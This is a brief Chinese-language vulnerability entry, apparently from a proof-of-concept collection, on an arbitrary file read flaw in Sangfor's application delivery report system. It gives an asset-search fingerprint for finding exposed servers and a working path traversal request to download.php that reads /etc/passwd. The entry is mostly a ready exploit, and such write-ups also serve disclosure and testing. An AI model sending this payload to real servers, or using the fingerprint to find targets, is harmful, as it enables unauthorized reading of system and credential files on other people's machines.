# 深信服 应用交付报表系统 download.php 任意文件读取漏洞

## 漏洞描述

深信服 应用交付报表系统 download.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文件

## 漏洞影响

<a-checkbox checked>深信服 应用交付报表系统</a-checkbox></br>	

## 网络测绘

<a-checkbox checked>app="SANGFOR-应用交付报表系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646063330818-50320d99-80e6-4f24-9ac7-1de5acf8d3d6.png)

验证POC

```javascript
/report/download.php?pdf=../../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1646063383225-b9436429-8a97-4675-9a24-29539b3e5be5.png)